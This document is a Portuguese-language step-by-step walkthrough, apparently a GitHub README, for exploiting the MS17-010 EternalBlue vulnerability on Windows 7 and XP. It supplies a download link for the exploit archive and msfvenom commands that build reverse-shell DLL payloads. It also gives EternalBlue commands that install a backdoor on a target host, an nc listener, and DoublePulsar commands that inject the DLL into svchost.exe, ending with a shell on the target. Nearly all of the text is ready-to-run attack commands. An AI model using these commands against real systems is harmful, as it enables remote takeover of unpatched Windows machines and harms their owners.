Realize o download do exploit, descompacte o arquivo ms17-010.tar.gz.
<br>

https://github.com/d3fudd/MS17-010_EternalBlue/raw/main/ms17-010.tar.gz
```
tar xf ms17-010.tar.gz
```
```
cd ms17-010/win7xp/
```
### Exploração
Gerando payload reverse shell non-staged com **msfvenom** para explorar **Windows 32 bits**
```
msfvenom -p windows/shell_reverse_tcp LHOST=172.20.1.53 LPORT=8080 -f dll > shell.dll
```

ou

Gerando payload reverse shell non-staged com **msfvenom** para explorar **Windows 64 bits**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.20.1.53 LPORT=8080 -f dll > shell.dll
```
- IP da máquina atacante: 172.20.1.53
- Porta que irá receber a conexão reversa: 8080
<br>

Instalando backdoor no servidor alvo com EternalBlue **(Windows 7)**:
```
wine Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
```

ou

Instalando backdoor no servidor alvo com EternalBlue **(Windows XP)**:
```
wine Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target XP --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
```
- IP do servidor alvo: 172.16.1.145
<br>

Preparando a máquina atacante para receber a conexão reversa **(em outro terminal)**:
```
rlwrap nc -vnlp 8080
```
<br>

Enviando shellcode para injetar DLL com DoublePulsar **(para explorar Windows 32 bits)**:
```
wine Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll
```

ou

Enviando shellcode para injetar DLL com DoublePulsar **(para explorar Windows 64 bits)**:
```
wine Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x64 --Function Rundll
```
- IP do servidor alvo: 172.16.1.145
<br>
 
Observe que a conexão reversa foi estabelecida e foi obtido acesso ao prompt de comando do Windows:
![win7xp_poc](https://user-images.githubusercontent.com/76706456/197264178-7f4e5c55-00f2-4499-8461-ab6087cad01a.gif)
